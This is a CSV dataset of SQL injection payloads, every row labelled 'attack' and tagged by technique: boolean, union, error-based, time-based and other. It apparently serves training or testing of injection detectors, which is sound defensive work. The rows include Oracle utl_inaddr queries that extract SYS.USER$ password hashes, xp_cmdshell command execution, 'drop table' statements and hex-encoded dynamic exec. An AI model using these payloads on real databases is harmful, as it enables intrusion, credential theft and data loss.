label,payload,family
attack," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",boolean
attack, or uid like '%,boolean
attack,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  '1' union select \,@@VERSION -- 1'",union
attack,0 or 1  =  1,boolean
attack,"admin""  )   or ""1""  =  ""1",boolean
attack,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",error
attack,"&apos, OR",other
attack,"sqlvuln,",other
attack,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',boolean
attack,""" or """"*""",other
attack,"hi or 1  =  1 --""",boolean
attack,", exec master..xp_cmdshell 'ping 172.10.1.255'--",other
attack," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,boolean
attack,   (  select top 1,other
attack,Ã½ or 1  =  1 --,boolean
attack,a' --,other
attack, or 1  =  1 /*,boolean
attack," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",union
attack,--,other
attack," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",union
attack,select * from users where id  =  1 *1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",boolean
attack,‘ or 1  =  1 --,boolean
attack," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",union
attack,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,boolean
attack,or 'a'  =  'a,boolean
attack,declare @s varchar  (  22  )   select @s   = ,other
attack," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",union
attack," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",union
attack,@variable,other
attack,", exec master..xp_cmdshell",other
attack,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",union
attack," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",boolean
attack,or x  =  x,boolean
attack,or '1'  =  '1,boolean
attack," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",union
attack,   )    )    or    (    (   'x'   )    )     =     (    (   'x,boolean
attack," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",error
attack,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",time
attack,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",union
attack,a' or 1  =  1--,boolean
attack, )   or   (  a  =  a,boolean
attack,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",boolean
attack," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",boolean
attack," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",union
attack,-- &password  = ,other
attack," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",error
attack,admin' or 1  =  1,boolean
attack," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 union select @||1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",union
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",error
attack,pg_sleep  (  __TIME__  )  --,time
attack,‘ or 3  =  3 --,boolean
attack," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",boolean
attack," )   union select * from information_schema.tables,",union
attack," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",boolean
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,error
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",error
attack,""" or """" """,other
attack,",waitfor delay '0:0:__TIME__'--",time
attack, or 1  =  1 --,boolean
attack,1' and non_existant_table   =   '1,boolean
attack," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",union
attack,"x' AND userid IS NULL, --",boolean
attack," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 union select @<@,version  (    )   -- 1",union
attack," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",union
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,error
attack,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",boolean
attack,UNION ALL SELECT,union
attack,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack,x' or full_name like '%bob%,boolean
attack,"x' and members.email is NULL, --",boolean
attack, or 2 > 1,boolean
attack,select * from users where id  =  1.*1 or 1  =  1 -- 1,boolean
attack,"""  )   or pg_sleep  (  __TIME__  )  --",time
attack, ',other
attack," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,boolean
attack, )   or sleep  (  __TIME__  )    =  ',time
attack,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",boolean
attack,or sleep  (  __TIME__  )    =  ',time
attack," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",union
attack," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",union
attack,", exec   (  'sel' + 'ect us' + 'er'  ) ",other
attack,anything' OR 'x'  =  'x,boolean
attack," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",union
attack,&',other
attack,a' or 3  =  3--,boolean
attack," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack,""" or """"&""",other
attack," )    )   ,waitfor delay '0:0:__TIME__'--",time
attack," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",boolean
attack,1 waitfor delay '0:0:10'--,time
attack,bfilename,other
attack,admin'  )   or   (  '1'  =  '1'--,boolean
attack,UEf,other
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",error
attack,or sleep  (  __TIME__  )  #,time
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",error
attack," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",boolean
attack,||6,other
attack,or 1/*,boolean
attack," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",boolean
attack,select * from users where id  =  1.%@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",boolean
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",error
attack,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",union
attack,or 'whatever' in   (  'whatever'  ) ,other
attack,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,other
attack,select * from users where id  =  '1'   or 1  =  1 -- 1',boolean
attack,?,other
attack, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,error
attack," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",union
attack,"admin""  )   or   (  ""1""  =  ""1""#",boolean
attack," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",boolean
attack, or '' ',other
attack," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",boolean
attack,or 1  =  1,boolean
attack," , drop table temp --",other
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",error
attack,""" or ""x""  =  ""x",boolean
attack," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",union
attack, or 'something' like 'some%',boolean
attack,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",time
attack," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",error
